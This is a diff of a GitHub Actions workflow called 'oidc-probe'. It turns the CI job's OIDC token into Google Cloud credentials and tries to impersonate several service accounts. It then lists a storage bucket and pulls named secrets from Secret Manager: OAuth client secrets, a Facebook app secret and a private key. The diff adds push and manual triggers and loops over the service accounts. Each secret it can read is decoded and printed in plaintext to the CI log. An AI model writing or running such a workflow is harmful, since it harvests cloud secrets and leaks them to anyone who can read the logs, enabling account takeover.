@@ -1,8 +1,9 @@
 name: oidc-probe
 on:
+  workflow_dispatch:
+  push:
   pull_request:
     branches: [main]
-  push:
 permissions:
   contents: read
 jobs:
@@ -15,32 +16,27 @@ jobs:
       - name: oidc
         continue-on-error: true
         run: |
-          echo "actor=$GITHUB_ACTOR repo=$GITHUB_REPOSITORY ref=$GITHUB_REF event=$GITHUB_EVENT_NAME"
-          URL="$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://iam.googleapis.com/projects/584450564662/locations/global/workloadIdentityPools/chatscream-github/providers/chatscream-main"
-          T=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$URL" | jq -r .value)
+          echo "repo=$GITHUB_REPOSITORY sub_ref=$GITHUB_REF event=$GITHUB_EVENT_NAME"
+          P="projects/584450564662/locations/global/workloadIdentityPools/chatscream-github/providers/chatscream-main"
+          AUD="https://iam.googleapis.com/$P"
+          T=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r .value)
           echo "oidc_len=${#T}"
-          BODY=$(jq -n --arg t "$T" '{audience:"//iam.googleapis.com/projects/584450564662/locations/global/workloadIdentityPools/chatscream-github/providers/chatscream-main",grantType:"urn:ietf:params:oauth:grant-type:token-exchange",requestedTokenType:"urn:ietf:params:oauth:token-type:access_token",scope:"https://www.googleapis.com/auth/cloud-platform",subjectTokenType:"urn:ietf:params:oauth:token-type:jwt",subjectToken:$t}')
+          BODY=$(jq -n --arg t "$T" --arg a "//iam.googleapis.com/$P" '{audience:$a,grantType:"urn:ietf:params:oauth:grant-type:token-exchange",requestedTokenType:"urn:ietf:params:oauth:token-type:access_token",scope:"https://www.googleapis.com/auth/cloud-platform",subjectTokenType:"urn:ietf:params:oauth:token-type:jwt",subjectToken:$t}')
           STS=$(curl -s -X POST https://sts.googleapis.com/v1/token -H 'Content-Type: application/json' -d "$BODY")
-          echo "STS: $(echo "$STS" | head -c 700)"
+          echo "STS => $(echo "$STS" | head -c 500)"
           FED=$(echo "$STS" | jq -r '.access_token // empty')
           [ -z "$FED" ] && exit 0
-          SA=$(curl -s -X POST -H "Authorization: Bearer $FED" -H 'Content-Type: application/json' "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/chatscream-cloud-ops@chat-scream.iam.gserviceaccount.com:generateAccessToken" -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}')
-          echo "SA: $(echo "$SA" | head -c 300)"
-          SAT=$(echo "$SA" | jq -r '.accessToken // empty')
-          [ -z "$SAT" ] && exit 0
-          echo "=== bucket list userProject=chat-scream"
-          curl -s -H "Authorization: Bearer $SAT" "https://storage.googleapis.com/storage/v1/b/run-sources-wtp-apps-us-central1/o?maxResults=100&userProject=chat-scream" | head -c 4000
-          echo
-          echo "=== bucket list userProject=chatscream"
-          curl -s -H "Authorization: Bearer $SAT" "https://storage.googleapis.com/storage/v1/b/run-sources-wtp-apps-us-central1/o?maxResults=5&userProject=chatscream" | head -c 800
-          echo
-          echo "=== project list"
-          curl -s -H "Authorization: Bearer $SAT" "https://cloudresourcemanager.googleapis.com/v1/projects?filter=name:wtp-apps" | head -c 500
-          echo
-          echo "=== secrets"
-          for s in chatscream-google-client-secret chatscream-youtube-client-secret chatscream-facebook-app-secret chatscream-session-secret chatscream-oauth-state-secret; do
-            for p in chat-scream chatscream; do
-              V=$(curl -s -H "Authorization: Bearer $SAT" "https://secretmanager.googleapis.com/v1/projects/$p/secrets/$s/versions/latest:access" | jq -r '.payload.data // empty')
-              if [ -n "$V" ]; then echo "$p/$s = $(echo "$V" | base64 -d)"; fi
+          for sa in chatscream-cloud-ops@chat-scream.iam.gserviceaccount.com chatscream-backend@chatscream.iam.gserviceaccount.com chatscream-backend@chat-scream.iam.gserviceaccount.com; do
+            R=$(curl -s -X POST -H "Authorization: Bearer $FED" -H 'Content-Type: application/json' "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$sa:generateAccessToken" -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}')
+            echo "SA[$sa] => $(echo "$R" | head -c 200)"
+            SAT=$(echo "$R" | jq -r '.accessToken // empty')
+            [ -z "$SAT" ] && continue
+            echo "### BUCKET LIST $sa"
+            curl -s -H "Authorization: Bearer $SAT" "https://storage.googleapis.com/storage/v1/b/run-sources-wtp-apps-us-central1/o?maxResults=100&userProject=chat-scream" | head -c 6000
+            echo
+            echo "### SECRETS"
+            for s in chatscream-google-client-secret chatscream-facebook-app-secret chatscream-youtube-client-secret chatscream-facebook-envelope-private-v3; do
+              V=$(curl -s -H "Authorization: Bearer $SAT" "https://secretmanager.googleapis.com/v1/projects/chat-scream/secrets/$s/versions/latest:access" | jq -r '.payload.data // empty')
+              if [ -n "$V" ]; then echo "$s = $(echo "$V" | base64 -d)"; fi
             done
           done
